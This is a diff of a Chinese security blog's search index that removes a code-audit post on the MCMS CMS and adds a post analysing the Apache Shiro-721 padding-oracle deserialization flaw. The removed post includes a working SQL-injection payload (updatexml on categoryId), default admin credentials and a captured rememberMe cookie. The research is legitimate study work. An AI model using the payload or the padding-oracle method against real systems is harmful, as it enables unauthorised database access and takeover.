@@ -6056,104 +6056,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MCMS代码审计</title>
-    <url>/2022/01/15/MCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0X01-环境搭建"><a href="#0X01-环境搭建" class="headerlink" title="0X01 环境搭建"></a>0X01 环境搭建</h1><p>项目地址下载：<a href="https://gitee.com/mingSoft/MCMS">https://gitee.com/mingSoft/MCMS</a></p>
-<p>当前版本：5.2.5  也可下载的releases版本 5.2.4</p>
-<p><img src="image-20220115193615578.png" alt="image-20220115193615578"></p>
-<p>PS：注意Mysql版本需大于5.6以上</p>
-<p>创建一个mcms数据库，并且导入doc/数据库文件</p>
-<p>在<code>application-dev</code>中修改数据库账户密码</p>
-<p>运行<code>MSApplication.java main</code>方法，如下图，环境无问题</p>
-<p>管理员：msopen/密码：msopen</p>
-<p><img src="image-20220115195620671.png" alt="image-20220115195620671"></p>
-<h2 id="外置环境配置"><a href="#外置环境配置" class="headerlink" title="外置环境配置"></a>外置环境配置</h2><p>搭建Tomcat环境</p>
-<blockquote>
-<p>注意：环境最好使用1.8版本，作者使用15版本，打包war时一直报错，版本不对，最后将1.8设置默认版本后才成功。</p>
-</blockquote>
-<p>使用maven打包，点击如下图标，设置</p>
-<p><img src="image-20220118215206232.png" alt="image-20220118215206232"></p>
-<p><img src="image-20220118215232442.png" alt="image-20220118215232442"></p>
-<p>新建 tomcat server ，导入即可</p>
-<p><img src="image-20220118215629972.png" alt="image-20220118215629972"></p>
-<p>搭建成功，如果登录后提示分页插件出错</p>
-<p>原因：参考其他大佬的</p>
-<p>MSServletInitializer.java 文件从项目中删除即可,因为该类也继承了SpringBootServletInitializer类，所以导致PageHelper插件被配置了两次</p>
-<p>参考链接：<a href="https://www.zhihu.com/question/330677156">https://www.zhihu.com/question/330677156</a></p>
-<h2 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h2><p><img src="image-20220118220646126.png" alt="image-20220118220646126"></p>
-<p>其中我们主要关注红框的三个目录</p>
-<ul>
-<li>Action  控制器层</li>
-<li>biz     业务逻辑层</li>
-<li>dao     数据库交互层</li>
-</ul>
-<p>并且在cms中并未发现全局过滤文件。</p>
-<p>作者后端技术框架</p>
-<p><img src="image-20220118222701099.png" alt="image-20220118222701099"></p>
-<h1 id="0X02-SQL注入漏洞"><a href="#0X02-SQL注入漏洞" class="headerlink" title="0X02 SQL注入漏洞"></a>0X02 SQL注入漏洞</h1><h2 id="MyBatis-SQL-注入前置知识"><a href="#MyBatis-SQL-注入前置知识" class="headerlink" title="MyBatis SQL 注入前置知识"></a>MyBatis SQL 注入前置知识</h2><p>根据作者发布的配置文档可知， 后端使用的是 ORM框架 MyBatis </p>
-<p>MyBatis 的 SQL 语句可以使用注解方法写在类方法上，也可以使用 xml 的方式，而使用的最多的方式就是将语句写入 xml 文件中。</p>
-<p>编写 xml 文件时，MyBatis  支持两种参数符号</p>
-<ul>
-<li><code>$</code>  – 拼接 SQL<ul>
-<li><code>#</code>  – 使用预编译</li>
-</ul>
-</li>
-</ul>
-<p>当语句使用 <code>$</code> 拼接时，则会产生 SQL 注入漏洞。</p>
-<p>参考链接：<a href="https://www.freebuf.com/vuls/240578.html">https://www.freebuf.com/vuls/240578.html</a></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们关注 dao 目录，可以发现作者使用的是 xml 文件方式写入的</p>
-<p>右键点击 Find in Path 选中 File mask 在 dao 目录下搜索 xml 文件</p>
-<p><code>$</code> 搜索，发现有两条 select 语句均使用了 <code>$</code> 拼接参数 categoryId，跟进</p>
-<p><img src="image-20220118223834663.png" alt="image-20220118223834663"></p>
-<p>漏洞点：src/main/java/net/mingsoft/cms/dao/IContentDao.xml</p>
-<p>可以发现 这条 select 语句是属于 select 标签 id 是 query，说明是 query 方法调用</p>
-<p><img src="image-20220118224150971.png" alt="image-20220118224150971"></p>
-<p>IContentDao.xml 对应的映射接口类是 net.mingsoft.cms.dao.c，此文件中并未找到 query 方法，此时我们继续跟进到父类 IBaseDao（net.mingsoft.base.dao.IBaseDao）</p>
-<p><img src="image-20220118224431593.png" alt="image-20220118224431593"></p>
-<p>在父类 IBaseDao 中找到 query 方法，IContentDao 接口类 继承父类 IBaseDao，所以可调用 query 方法</p>
-<p><img src="image-20220118224807165.png" alt="image-20220118224807165"></p>
-<p>此时，我们需要去寻找 query 方法的对应的实现类。</p>
-<p>IContentDao 对应的业务接口是 net.mingsoft.cms.biz.IContentBiz，而实现类是net.mingsoft.cms.biz.impl.ContentBizImpl，同理，跟进 ContentBizImpl 的 父类 BaseBizImpl（net.mingsoft.base.biz.impl.BaseBizImpl）发现父类中实现了 query 方法，调用了 dao 层的 query 方法</p>
-<p><img src="image-20220118225654859.png" alt="image-20220118225654859"></p>
-<p>现在我们只需要跟进控制器层代码，寻找 categoryId 可控点，即可完成整个调用链。</p>
-<p>对应的控制器文件 src/main/java/net/mingsoft/cms/action/ContentAction.java 104行处</p>
-<p><img src="image-20220118230301298.png" alt="image-20220118230301298"> </p>
-<p><code>@ApiImplicitParam </code> 注解中定义了 categoryId 参数对应的是所属栏目，使用的方法是 query</p>
-<p>而 127行 对应的调用处是 list 并且使用 post 方法获取到上述所有需要查询的参数并放到 content 中，通过 query 方法去查询对应的数据</p>
-<p><img src="image-20220118230705712.png" alt="image-20220118230705712"></p>
-<p>此时我们可以去登录，验证漏洞是否存在</p>
-<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>功能大全-&gt;文章管理 抓包</p>
-<p><img src="image-20220118232135765.png" alt="image-20220118232135765"></p>
-<p>在 pageSize 后面添加 categoryId 参数</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Payload: categoryId=1' and updatexml(1,concat(0x7e,databases(),0x7e),1) and '1</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="image-20220118232024944.png" alt="image-20220118232024944"></p>
-<p><img src="image-20220118231714788.png" alt="image-20220118231714788"></p>
-<p>成功，同时可以使用 Mysql 数据库监控程序，查看和数据库交互的语句</p>
-<p><img src="image-20220118232519574.png" alt="image-20220118232519574"></p>
-<p>注入的语句</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">select count(0) from ( select ct.* from ( select ct.*,cc.category_path from cms_content ct join cms_category cc on ct.category_id=cc.id WHERE ct.del=0 and (ct.category_id='1'' and updatexml(1,concat(0x7e,user(),0x7e),1) and ''1' or ct.category_id in (select id FROM cms_category where find_in_set('1' and updatexml(1,concat(0x7e,user(),0x7e),1) and '1',CATEGORY_PARENT_IDS)&gt;0)) )ct ORDER BY ct.content_datetime desc,content_sort desc ) tmp_count</span><br></pre></td></tr></tbody></table></figure>
-
-<p>抓包时，还发现了华点。。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rememberMe=rWugSNNLZQzRFHaq7ak+mgedIxoeZBy4qAquhNineUSo8u1NL/L4YCkX4vhDD9i1d/Hm2oBNc4ou74W/ALQNI5GYQH/tGQcYkffbwtjd4VZuoXD4D73yWZ3IGNIbVxXLJgk5WCc0VkOIizpA529fHxCurk4RLpC5K6EeX+J/TK8uGYnNtZyDz50BnbtF0UgntjTpRx++tnbB1XEpiUm4T/+AR1jH3U3RI/BCRXpAwg08lsFEBTYloTj+CqAHKMFCXOBIAdS4F/2pnHJfba7KU2JKNap0xu8maiRCs3+qYPncV3dpwzA8KyVOvnUIaNxOBSMEclpiQi1ykpwd32e4eqcC4Zey9lTJIp+znimCIszR5Qrn3SGewegH7BOrzdSkyHpDJxPWwejq9UYJ6ZkthidmrM8YVRHD8+kJGpkt/po42qP4JmGW6JP4Wt4StgsJZEO+bS/HjFwOpbDkJ3nnqZGaZzoAUmI+TaF8yPE9fmHNg01HtbiJsR8Ml6YcDXJdTOZ0xzPaGnUanggXwlL2x3DEndd0DKHfMHe8NNEe0KTMPoI+/ScWkF+Ogjomuo2mRqVMVWdYMsimMB73MFfW+9U/ugVVREqzSuH7Ym1KdwvtsCrQBMjLBz7P6d10Uvi2zL8g86u8wKhKoBg5gu8jmO8tQJkdb53VMpYNpyc8SnujThz/CQgyRjPRJ6v9lINR7rRQ0SjTU2wHIJfToaIOerDgxj2wTcw2tcLJKj8fj0DamOAdXrNhayx1xHYS16bU9PO3TteshfPCPOBrC31SKKY1RxTMBcMFrDTApI0n9eSOhDttMHp879iibCXXgH17TfrXIsymd+5iSCpkKJCruhwZJyi8TtvShgotzE0OumKObevO2p1/D2lWX1yuZ2zL2wSMtKReGo5g8ONab5bOQsp+B++LjFhLUsBLqWiBT1L8wNwJl5yTy1jgdpC2tmkz0judbdp/h9E6J9pDEhUsUllYeVyzadnCYugRDMrNbcDFusdUKOUZrz8yBLTuHcPopP1hmDJnotSnvKuAdg36mUzuipolOMGHz49OkAzQE9y8aV1S33hBMs8dCF+1bL+VZYKlpPriP5LWrEiKzf3v/L9sojsDrLzbhZjbBaZ2zkUdh9O/dyWyw4hBSNVUYmO3pjTjIWBbhiBFKjc12S6jcTP/QPkY1i9deoMhMhHuP0gYlNiL4YLpsnXnAwaElaTutHWPbQcHQhXQounbYJRIVGiXCj3aLNQ4wgOlZdLMAvcAoyRljrIrjQJcfInuQNCKMYf5d9ZbtCfB3NJyZ3H3ff56pS+ipZfJ6RMIijqMFHs448CGn0lqJjpFD/bH+CTQIEvwF7tHJw==</span><br></pre></td></tr></tbody></table></figure>
-
-<p>网站还使用 shiro 框架，后续可以跟踪一下此漏洞。</p>
-<h1 id="0X03-shiro反序列化"><a href="#0X03-shiro反序列化" class="headerlink" title="0X03 shiro反序列化"></a>0X03 shiro反序列化</h1><p>shiro配置文件：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">repository/net/mingsoft/ms-basic/2.1.10/ms-basic2.1.10.jar!/net/mingsoft/config/ShiroConfig.class</span><br></pre></td></tr></tbody></table></figure>
-
-<p>mcms作者将核心一些配置文件封装成 <code>ms-basic2.1.10.jar</code> </p>
-<p><img src="image-20220121223946513.png" alt="image-20220121223946513"></p>
-<p>ShiroConfig.class </p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">package net.mingsoft.config;</span><br><span class="line"></span><br><span class="line">import cn.hutool.core.codec.Base64;</span><br><span class="line">import java.util.LinkedHashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import net.mingsoft.basic.realm.ManagerAuthRealm;</span><br><span class="line">import net.mingsoft.basic.strategy.ILoginStrategy;</span><br><span class="line">import net.mingsoft.basic.strategy.IModelStrategy;</span><br><span class="line">import net.mingsoft.basic.strategy.ManagerLoginStrategy;</span><br><span class="line">import net.mingsoft.basic.strategy.ManagerModelStrategy;</span><br><span class="line">import org.apache.shiro.mgt.SecurityManager;</span><br><span class="line">import org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor;</span><br><span class="line">import org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line">import org.apache.shiro.web.mgt.CookieRememberMeManager;</span><br><span class="line">import org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line">import org.apache.shiro.web.servlet.SimpleCookie;</span><br><span class="line">import org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator;</span><br><span class="line">import org.springframework.beans.factory.annotation.Value;</span><br><span class="line">import org.springframework.context.annotation.Bean;</span><br><span class="line">import org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line">@Configuration</span><br><span class="line">public class ShiroConfig {</span><br><span class="line">    @Value("${ms.manager.path}")</span><br><span class="line">    private String managerPath;</span><br><span class="line">    @Value("${ms.shiro-key}")</span><br><span class="line">    private String shiroKey;</span><br><span class="line"></span><br><span class="line">    public ShiroConfig() {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //自动代理配置</span><br><span class="line">    public DefaultAdvisorAutoProxyCreator advisorAutoProxyCreator() {</span><br><span class="line">        DefaultAdvisorAutoProxyCreator advisorAutoProxyCreator = new DefaultAdvisorAutoProxyCreator();</span><br><span class="line">        advisorAutoProxyCreator.setProxyTargetClass(true);//设置为ture</span><br><span class="line">        return advisorAutoProxyCreator;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //设置权限</span><br><span class="line">    public AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor(SecurityManager securityManager) {</span><br><span class="line">        AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor = new AuthorizationAttributeSourceAdvisor();</span><br><span class="line">        authorizationAttributeSourceAdvisor.setSecurityManager(securityManager);</span><br><span class="line">        return authorizationAttributeSourceAdvisor;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean  //获取当前权限</span><br><span class="line">    public AuthorizationAttributeSourceAdvisor getAuthorizationAttributeSourceAdvisor(DefaultWebSecurityManager securityManager) {</span><br><span class="line">        AuthorizationAttributeSourceAdvisor advisor = new AuthorizationAttributeSourceAdvisor();</span><br><span class="line">        advisor.setSecurityManager(securityManager);</span><br><span class="line">        return advisor;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //获取当前代理</span><br><span class="line">    public DefaultAdvisorAutoProxyCreator getDefaultAdvisorAutoProxyCreator() {</span><br><span class="line">        DefaultAdvisorAutoProxyCreator autoProxyCreator = new DefaultAdvisorAutoProxyCreator();</span><br><span class="line">        autoProxyCreator.setProxyTargetClass(true);</span><br><span class="line">        return autoProxyCreator;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //设置过滤器，配置账户权限</span><br><span class="line">    public ShiroFilterFactoryBean shirFilter(SecurityManager securityManager) {</span><br><span class="line">        ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean();</span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(securityManager);</span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(this.managerPath + "/login.do");</span><br><span class="line">        shiroFilterFactoryBean.setUnauthorizedUrl(this.managerPath + "/404.do");</span><br><span class="line">        Map&lt;String, String&gt; filterChainDefinitionMap = new LinkedHashMap();</span><br><span class="line">        filterChainDefinitionMap.put("/static/**", "anon");</span><br><span class="line">        filterChainDefinitionMap.put("/html/**", "anon");</span><br><span class="line">        filterChainDefinitionMap.put(this.managerPath + "/login.do", "anon");</span><br><span class="line">        filterChainDefinitionMap.put(this.managerPath + "/checkLogin.do", "anon");</span><br><span class="line">        filterChainDefinitionMap.put(this.managerPath + "/**", "user");</span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);</span><br><span class="line">        return shiroFilterFactoryBean;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //配置管理用户</span><br><span class="line">    public SecurityManager securityManager() {</span><br><span class="line">        DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();</span><br><span class="line">        securityManager.setRealm(this.customRealm());</span><br><span class="line">        securityManager.setRememberMeManager(this.rememberMeManager());</span><br><span class="line">        return securityManager;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">		//设置 cookie值 rememberMe</span><br><span class="line">    public SimpleCookie rememberMeCookie() {</span><br><span class="line">        SimpleCookie cookie = new SimpleCookie("rememberMe");</span><br><span class="line">        cookie.setMaxAge(86400);//过期时间</span><br><span class="line">        return cookie;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public CookieRememberMeManager rememberMeManager() {</span><br><span class="line">        CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();</span><br><span class="line">        cookieRememberMeManager.setCookie(this.rememberMeCookie());</span><br><span class="line">        cookieRememberMeManager.setCipherKey(Base64.decode(this.shiroKey));</span><br><span class="line">        return cookieRememberMeManager;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public ManagerAuthRealm customRealm() {</span><br><span class="line">        return new ManagerAuthRealm();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public IModelStrategy modelStrategy() {</span><br><span class="line">        return new ManagerModelStrategy();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public ILoginStrategy loginStrategy() {</span><br><span class="line">        return new ManagerLoginStrategy();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-]]></content>
-      <categories>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>JAVA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java反序列化-shiro-550反序列化漏洞(四)</title>
     <url>/2022/01/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9B/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0X01-shiro-550反序列漏洞"><a href="#0X01-shiro-550反序列漏洞" class="headerlink" title="0X01 shiro-550反序列漏洞"></a>0X01 shiro-550反序列漏洞</h1><p>最近审计到一套CMS，发现存在shiro反序列化漏洞，但之前没有分析复现过，审计的时候比较吃力。所以有了本篇文章，迟早要学，不如就现在。</p>
@@ -6282,12 +6184,732 @@
   <entry>
     <title>Java反序列化-shiro-721反序列化(五)</title>
     <url>/2022/01/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%94/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
+<p>收集了网上很多关于 shiro 721序列化的文章，发现都有讲加密这一块，所以也准备跟着文章来学习一下。</p>
+</blockquote>
+<h1 id="0X01-AES-加解密"><a href="#0X01-AES-加解密" class="headerlink" title="0X01 AES 加解密"></a>0X01 AES 加解密</h1><p>目前的密码体制可以分为两种：“对称加密” 和 “非对称加密”</p>
+<p>对称加密  – 加解密密钥都是同一个，既可加密又可解密</p>
+<pre><code>- AES
+- DES
+</code></pre>
+<p>非对称加密  – 一对密钥由公钥和私钥组成，公私钥都可用来加解密。私钥不能外泄，公钥可以交给所有请求方</p>
+<ul>
+<li>RSA</li>
+<li>ECC</li>
+<li>Rabin</li>
+<li>背包算法</li>
+<li>Elgamal</li>
+<li>……</li>
+</ul>
+<p>目前对称加密 AES 和非对称加密 RSA 使用的比较广泛。</p>
+<h2 id="AES-算法"><a href="#AES-算法" class="headerlink" title="AES 算法"></a>AES 算法</h2><p>我们都知道 shiro 是用的 AES 加密方法，AES 属于分组加密算法</p>
+<p>明文长度固定为 <code>128</code> 位。</p>
+<p>密钥长度可以是 <code>128</code>、<code>192</code> 、<code>256</code> 位</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfmizslj30xs0dqjso.jpg" alt="image-20220128024748684"></p>
+<p>分组加密模式共有五种</p>
+<ul>
+<li><strong><code>ECS</code> ( Electronic Codebook Book , 电话本模式 )</strong></li>
+<li><strong><code>CBC</code> ( Cipher Block Chaining , 密码分组链接模式 )</strong></li>
+<li><strong><code>CTR</code> ( Counter , 计算器模式 )</strong></li>
+<li><strong><code>CFB</code> ( Cipher FeedBack , 密码反馈模式 )</strong></li>
+<li><strong><code>OFB</code> ( Output FeedBack , 输出反馈模式 )</strong></li>
+</ul>
+<p>shiro 1.4.1 版本中，加密方式并没有修改加密方法，只是将固定密钥更换成随机，所以本次也跟着大佬的文章看看 <code>CBC</code> 模式的加密模式。</p>
+<p><code>CBC</code> 密码分组链接模式，密文分组像链条一样相互连接，将明文分割成若干组，每组和上一组的密文进行 XOR（异或）运算，得到的密文会和下一组明文进行加密。由于第一段明文没有对应的密文，所以引入了一个初始化向量 <code>IV（Initialization Vector ）</code> ，此向量是一个固定长度的随机值(8个字节)，和第一段明文一起加密。</p>
+<p>如下图所示：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfr1wigj30k7087gm8.jpg" alt="image-20220131145305146"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfmb49ej30ke088aaq.jpg" alt="image-20220131145354828"></p>
+<h2 id="Padding-加密"><a href="#Padding-加密" class="headerlink" title="Padding 加密"></a>Padding 加密</h2><p>我们还要注意一点的是填充方式。</p>
+<p>在分组加密时，把明文以 128 bits(16 Bytes) 分割成多个组，当最后一组不足 16 Bytes 时，会使用 Padding 机制填充，直到补齐 16 bytes 为止。</p>
+<p><code>CBC</code> 加密模式下可用的 Padding 方式有三种：</p>
+<ol>
+<li><strong><code>NoPadding</code> : 明文长度必须是 8 Bytes 的倍数 , 否则会报错 .</strong></li>
+<li><strong><code>PKCS5Padding</code> : 以完整字节填充 , 每个填充字节的值是用于填充的字节数 . 即要填充 <code>N</code> 个字节 , 每个字节都为 <code>N</code>.</strong></li>
+</ol>
+<blockquote>
+<p><strong>举例 : 使用 PKCS5Padding 方式填充 3 个字节 : <code>| AA BB CC DD EE 03 03 03 |</code></strong></p>
+</blockquote>
+<ol start="3">
+<li><strong><code>ISO10126Padding</code> : 以随机字节填充 , 最后一个字节为填充字节的个数 .</strong></li>
+</ol>
+<blockquote>
+<p><strong>举例 : 使用 ISO10126Padding 方式填充 5 个字节 : <code>| AA BB CC A9 3B 78 04 05 |</code></strong></p>
+</blockquote>
+<p>如下图</p>
+<p><img src="https://www.guildhab.top/wp-content/uploads/2020/11/072514_1550_PaddingOrac2.png" alt="img"></p>
+<h2 id="Padding-Oracle-Attack-填充-Oracle-攻击"><a href="#Padding-Oracle-Attack-填充-Oracle-攻击" class="headerlink" title="Padding Oracle Attack (填充 Oracle 攻击)"></a>Padding Oracle Attack (填充 Oracle 攻击)</h2><p>填充 Oracle 攻击中的 Oracle 中是通过接收特定加密数据，解密并验证填充是否正确的方式。</p>
+<p>攻击者会反复发送一段密文，每次发送时都对填充数据进行少许改变。由于接收者（服务器）在无法正确解密时会返回一个错误消息，攻击者通过这一错误消息就可以获得一部分与明文相关的信息。</p>
+<p><strong>例如：</strong></p>
+<ol>
+<li><p><strong>客户端实现了用户登录功能 ; 用户登录后 , 客户端会将用户的ID进行 <code>AES/CBC/PKCS5Padding</code> 加密后发送到服务器处理 , 来验证用户是否存在.</strong></p>
+<p><strong>客户端将 AES 加密后的UID值放到URL中进行传输 : <code>https://guildhab.top?uid=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></strong></p>
+</li>
+<li><p><strong>服务端会接收客户端发送的数据 , 对参数UID的值进行AES解密处理.</strong></p>
+<p><strong>假设服务端会产生如下三种 AES 解密结果 :</strong></p>
+<ul>
+<li><strong>密文有效 , 填充有效 ===&gt; 用户存在 , 登录成功 . 服务端返回 <code>HTTP 200</code></strong></li>
+<li><strong>密文无效 ===&gt; 服务端返回用户不存在的报错信息 . 服务端返回 <code>HTTP 500</code></strong></li>
+<li><strong>密文有效 , 填充无效 ===&gt; 服务端返回后端自定义报错信息 . 服务端返回 <code>HTTP 301</code></strong></li>
+</ul>
+<p><strong>玩过 SQL 注入的师傅很快便能发现问题 : 根据第一个返回结果和第三个返回结果 . 可以通过暴力破解的方式来确定有效的填充值 .</strong></p>
+<p><strong>当服务端返回 “用户存在 , 登录成功” 的信息时 . 填充数据即为有效填充值 . 这个概念非常类似 SQL 注入里的 “盲注” , 属于一种侧信道攻击 .</strong></p>
+</li>
+</ol>
+<p>这里推荐去此博客，解释的挺不错</p>
+<p><a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e-%e5%88%86%e6%9e%90-%e4%b8%8a/">https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e-%e5%88%86%e6%9e%90-%e4%b8%8a/</a></p>
+<p>大致了解了 AES 加密流程，以及和 shiro 相关的安全问题。</p>
+<h1 id="0X02-shiro-721-漏洞分析"><a href="#0X02-shiro-721-漏洞分析" class="headerlink" title="0X02 shiro 721 漏洞分析"></a>0X02 shiro 721 漏洞分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载地址：<a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.4.1">https://github.com/apache/shiro/releases/tag/shiro-root-1.4.1</a></p>
+<p>导入 idea 后 根据 pox.xml 自动下载依赖包</p>
+<p>配置 Tomcat 环境</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfnran6j319m0u0q62.jpg" alt="image-20220125231936597"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfsvrq1j319j0u0wh9.jpg" alt="image-20220125232010567"></p>
+<p>启动 Tomcat </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfpm746j318a0p4ad6.jpg" alt="image-20220125232155606"></p>
+<p>搭建成功！</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>断点，我们还是打在 <code>shiro-shiro-root-1.4.1/core/src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code> getRememberedPrincipals 方法上</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfrh2itj30yf0bognd.jpg" alt="image-20220201233744299"></p>
+<p>启动后使用burp抓包，如果断点数据进不去</p>
+<p>可尝试如下方法。</p>
+<p><a href="https://developer.aliyun.com/ask/62156?spm=a2c6h.13159736">https://developer.aliyun.com/ask/62156?spm=a2c6h.13159736</a></p>
+<p>control + command + R 然后重新发送数据，数据就进入断点了。</p>
+<p>跟进 getRememberedSerializedIdentity 方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfo7uenj310d0nhtdm.jpg" alt="image-20220201234139185"></p>
+<p><code>getCookie().readValue</code> 获取 cookie 的值，并且和 <code>Cookie.DELETED_COOKIE_VALUE.equals</code> 进行对比 DELETED_COOKIE_VALUE 常量的值是 deleteMe 返回 false 则由 ensurePadding 处理 ，继续跟进 </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfu8g0nj30x208c3zh.jpg" alt="image-20220202000230661"></p>
+<p>这里判断 长度对4取模不等于0，就添加 = 号填充，并未做其他操作，继续跟进，代码执行完后，跳到 Base64.decode 这个函数 一看就是解密 base64 数据， 跟进</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfn760gj30y60ckmyj.jpg" alt="image-20220202000527309"></p>
+<p>这里 <code>CodecSupport.toBytes</code> 返回 UTF-8 的字节流数据</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfsdk8uj30xh057wf9.jpg" alt="image-20220202000733918"></p>
+<p>decode 里面做了循环调用，返回了一组字节流数据，并无其他调用</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfqlycxj30xh0crabv.jpg" alt="image-20220202001115245"></p>
+<p>执行完毕后，程序会自动跳转回 <code>getRememberedPrincipals</code> 继续跟进下一个函数</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfts2r7j30yr09uwg9.jpg" alt="image-20220202001224504"></p>
+<p>decrypt 解密 bytes ，直接跟进 </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfryfjuj30r106pmxt.jpg" alt="image-20220202001243549"></p>
+<p><code>getCipherService</code> 获取 AES 加密类，使用的是 CBC 模式 PKCS5Padding 填充方式 </p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfoo1stj30yn0kxq78.jpg" alt="image-20220202001436264"></p>
+<p><code>getDecryptionCipherKey</code> 获取解密密钥，先跟进 decrypt 方法，后续跟进密钥是怎么获取的</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfp5t8bj31bk0hoq6e.jpg" alt="image-20220202002707936"></p>
+<p><code>isGenerateInitializationVectors</code> 处理初始的 IV 值，AES的初始化向量iv就是rememberMe的base64解码后的前16个字节，攻击者只要使用有效的RememberMe cookie作为Padding Oracle Attack 的前缀，然后就可以构造RememberMe进行反序列化攻击，攻击者无需知道RememberMe加密的密钥。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gyyhfq4oraj31f50o8aew.jpg" alt="image-20220202003325656"></p>
+<p><code>decrypt</code> 会根据获取到的密文，密钥，初始 IV 值解密，跟进查看详细代码<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzo32l7arj316u0gkju9.jpg" alt="image-20220203003618676"></p>
